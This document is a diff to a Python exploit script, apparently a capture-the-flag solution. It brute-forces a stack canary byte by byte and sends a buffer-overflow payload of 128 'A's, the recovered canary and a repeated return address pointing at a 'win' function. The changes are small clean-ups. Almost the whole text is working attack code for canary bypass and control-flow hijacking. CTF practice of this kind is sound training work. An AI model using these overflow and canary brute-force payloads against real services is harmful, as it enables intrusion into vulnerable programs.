@@ -23,7 +23,6 @@ def attack_byte(byteIndex):
             continue
         canary[byteIndex] = b
         print(response)
-        print(b)
         print(canary)
         break
 
@@ -34,7 +33,7 @@ def attack():
     conn.readline()
     conn.readline()
     # 0x080486c6 - address of win
-    attack_message = ('A' * 128).encode() + b"cd41" + b"\xc6\x86\x04\x08" + b"\xc6\x86\x04\x08" + b"\xc6\x86\x04\x08"
+    attack_message = ('A' * 128).encode() + b"cd41" + b"\xc6\x86\x04\x08" * 4
     conn.send(attack_message)
     response = conn.recvall()
     print(response)
@@ -42,6 +41,5 @@ def attack():
 if __name__ == "__main__":
     # for i in range(4):
     #     attack_byte(i)
-    # [b'c', b'd', b'4', b'1']
+    # canary = [b'c', b'd', b'4', b'1']
     attack()
-
